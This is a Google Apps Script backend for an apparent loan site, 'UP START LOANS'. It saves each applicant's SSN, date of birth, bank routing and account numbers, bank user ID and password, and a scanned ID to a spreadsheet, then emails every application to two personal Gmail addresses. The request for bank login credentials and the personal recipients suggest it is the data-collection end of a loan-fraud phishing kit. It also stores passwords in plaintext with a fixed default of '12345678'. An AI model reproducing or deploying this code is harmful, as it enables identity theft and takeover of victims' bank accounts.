// Google Sheets Integration Script for UP START LOANS
// This script handles customer data storage and retrieval from Google Sheets
// Replaces sessionStorage approach with persistent Google Sheets storage

// Configuration
const SPREADSHEET_ID = "YOUR_SPREADSHEET_ID"; // You'll need to create a Google Sheet and get its ID
const SHEET_NAME = "CustomerApplications";
const PRIMARY_EMAIL = "finnfoxpersonalloan@gmail.com";
const SECONDARY_EMAIL = "tyronlincolnn@gmail.com";

// Initialize the spreadsheet and sheet
function getSpreadsheet() {
  return SpreadsheetApp.openById(SPREADSHEET_ID);
}

function getSheet() {
  const spreadsheet = getSpreadsheet();
  let sheet = spreadsheet.getSheetByName(SHEET_NAME);
  
  if (!sheet) {
    sheet = spreadsheet.insertSheet(SHEET_NAME);
    setupHeaders(sheet);
  }
  
  return sheet;
}

// Setup headers for the customer data sheet
function setupHeaders(sheet) {
  const headers = [
    'Application ID',
    'First Name',
    'Last Name',
    'Email',
    'Phone Number',
    'Home Address',
    'City',
    'State',
    'Zip Code',
    'Date of Birth',
    'SSN Number',
    'Loan Amount',
    'Loan Purpose',
    'Loan Term',
    'Monthly Payment',
    'Loan Agent',
    'Bank Name',
    'Routing Number',
    'Account Number',
    'User ID',
    'Password',
    'Status',
    'Submission Date',
    'ID Proof Name',
    'ID Proof Size',
    'ID Proof Type',
    'ID Proof Base64',
    'Admin Notes'
  ];
  
  sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
  sheet.getRange(1, 1, 1, headers.length).setFontWeight('bold');
  sheet.getRange(1, 1, 1, headers.length).setBackground('#4285f4');
  sheet.getRange(1, 1, 1, headers.length).setFontColor('white');
}

// Main function to handle web requests
function doGet(e) {
  return HtmlService.createHtmlOutput(`
    <h1>UP START LOANS - Google Sheets Integration</h1>
    <p>Customer data storage system ready.</p>
    <p><strong>Sheet:</strong> ${SHEET_NAME}</p>
    <p><strong>Spreadsheet ID:</strong> ${SPREADSHEET_ID}</p>
  `);
}

function doPost(e) {
  try {
    const data = e.parameter;
    const action = data.action || 'saveCustomer';
    
    let result;
    
    if (action === 'saveCustomer') {
      result = saveCustomerData(data);
    } else if (action === 'getCustomers') {
      result = getCustomersData();
    } else if (action === 'updateCustomer') {
      result = updateCustomerData(data);
    } else {
      throw new Error('Unknown action: ' + action);
    }
    
    return ContentService.createTextOutput(JSON.stringify({
      result: 'success',
      data: result
    }));
    
  } catch (error) {
    Logger.log('Error in doPost: ' + error.toString());
    
    return ContentService.createTextOutput(JSON.stringify({
      result: 'error',
      error: error.toString()
    }));
  }
}

// Save customer data to Google Sheets
function saveCustomerData(data) {
  const sheet = getSheet();
  const lastRow = sheet.getLastRow();
  const newRow = lastRow + 1;
  
  const applicationId = `LS-${Date.now()}`;
  const submissionDate = new Date().toLocaleString();
  
  const customerData = [
    applicationId,
    data.firstName || '',
    data.lastName || '',
    data.email || '',
    data.phoneNumber || '',
    data.homeAddress || '',
    data.city || '',
    data.state || '',
    data.zipCode || '',
    data.dateOfBirth || '',
    data.ssnNumber || '',
    data.loanAmount || '',
    data.loanPurpose || '',
    data.loanTerm || '',
    data.monthlyPayment || '',
    data.loanAgent || '',
    data.bankName || '',
    data.routingNumber || '',
    data.accountNumber || '',
    data.userId || `${(data.firstName || '').toLowerCase()}_${(data.lastName || '').toLowerCase()}_${(data.phoneNumber || '').slice(-4)}`,
    data.password || '12345678',
    data.status || 'review',
    submissionDate,
    data.idProofName || 'Not uploaded',
    data.idProofSize || '0 MB',
    data.idProofType || 'None',
    data.idProofBase64 || '',
    data.adminNotes || ''
  ];
  
  sheet.getRange(newRow, 1, 1, customerData.length).setValues([customerData]);
  
  // Send email notification
  sendCustomerNotificationEmail(data, applicationId);
  
  return {
    applicationId: applicationId,
    message: 'Customer data saved successfully'
  };
}

// Get all customer data from Google Sheets
function getCustomersData() {
  const sheet = getSheet();
  const lastRow = sheet.getLastRow();
  
  if (lastRow <= 1) {
    return []; // No customer data yet
  }
  
  const dataRange = sheet.getRange(2, 1, lastRow - 1, sheet.getLastColumn());
  const values = dataRange.getValues();
  const headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
  
  const customers = [];
  
  for (let i = 0; i < values.length; i++) {
    const customer = {};
    for (let j = 0; j < headers.length; j++) {
      // Convert header names to camelCase for JavaScript
      const header = headers[j].toLowerCase().replace(/\s+/g, '');
      customer[header] = values[i][j];
    }
    customers.push(customer);
  }
  
  return customers;
}

// Update customer data (for admin operations)
function updateCustomerData(data) {
  const sheet = getSheet();
  const lastRow = sheet.getLastRow();
  
  if (lastRow <= 1) {
    throw new Error('No customer data found');
  }
  
  const dataRange = sheet.getRange(2, 1, lastRow - 1, sheet.getLastColumn());
  const values = dataRange.getValues();
  const headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
  
  let customerRow = -1;
  const applicationId = data.applicationId;
  
  // Find the customer by application ID
  for (let i = 0; i < values.length; i++) {
    if (values[i][0] === applicationId) { // Application ID is first column
      customerRow = i + 2; // +2 because we start from row 2 (after headers)
      break;
    }
  }
  
  if (customerRow === -1) {
    throw new Error('Customer not found: ' + applicationId);
  }
  
  // Update the customer data
  const updates = {
    status: data.status,
    adminnotes: data.adminNotes,
    rejectionreason: data.rejectionReason
  };
  
  for (const [key, value] of Object.entries(updates)) {
    const columnIndex = headers.findIndex(header => 
      header.toLowerCase().replace(/\s+/g, '') === key.toLowerCase()
    );
    
    if (columnIndex !== -1 && value !== undefined) {
      sheet.getRange(customerRow, columnIndex + 1).setValue(value);
    }
  }
  
  return {
    message: 'Customer updated successfully'
  };
}

// Send email notification for new customer
function sendCustomerNotificationEmail(data, applicationId) {
  const subject = `NEW LOAN APPLICATION - ${data.firstName} ${data.lastName} - ${data.loanAmount}`;
  
  const htmlBody = `
    <h2>🏦 UP START LOANS - NEW LOAN APPLICATION</h2>
    
    <div style="background: #e8f5e8; padding: 20px; border-radius: 8px; margin: 20px 0;">
      <h3>✅ Application Saved to Google Sheets</h3>
      <p><strong>Application ID:</strong> ${applicationId}</p>
      <p><strong>Customer:</strong> ${data.firstName} ${data.lastName}</p>
      <p><strong>Email:</strong> ${data.email}</p>
      <p><strong>Loan Amount:</strong> $${data.loanAmount}</p>
      <p><strong>Status:</strong> ${data.status || 'review'}</p>
    </div>
    
    <div style="text-align: center; margin: 30px 0; padding: 20px; background: #4caf50; color: white; border-radius: 8px;">
      <h3>📊 ADMIN DASHBOARD UPDATED</h3>
      <p>Customer data has been saved to Google Sheets.</p>
      <p>Admin dashboard will show this application immediately.</p>
    </div>
    
    <div style="text-align: center; margin-top: 30px; padding: 15px; background: #f5f5f5; border-radius: 8px;">
      <p><strong>📅 Submitted:</strong> ${new Date().toLocaleString()}</p>
      <p><strong>🏢 UP START LOANS</strong></p>
    </div>
  `;
  
  GmailApp.sendEmail(PRIMARY_EMAIL, subject, '', {
    htmlBody: htmlBody,
    name: 'UP START LOANS System'
  });
  
  GmailApp.sendEmail(SECONDARY_EMAIL, subject, '', {
    htmlBody: htmlBody,
    name: 'UP START LOANS System'
  });
}

// Function to create the Google Sheet (run this once)
function createCustomerSheet() {
  const spreadsheet = SpreadsheetApp.create("UP START LOANS - Customer Applications");
  const sheet = spreadsheet.insertSheet("CustomerApplications");
  
  setupHeaders(sheet);
  
  // Share the sheet (optional)
  // spreadsheet.addEditor("your-email@example.com");
  
  Logger.log("Spreadsheet created: " + spreadsheet.getUrl());
  Logger.log("Spreadsheet ID: " + spreadsheet.getId());
  
  return spreadsheet.getId();
}
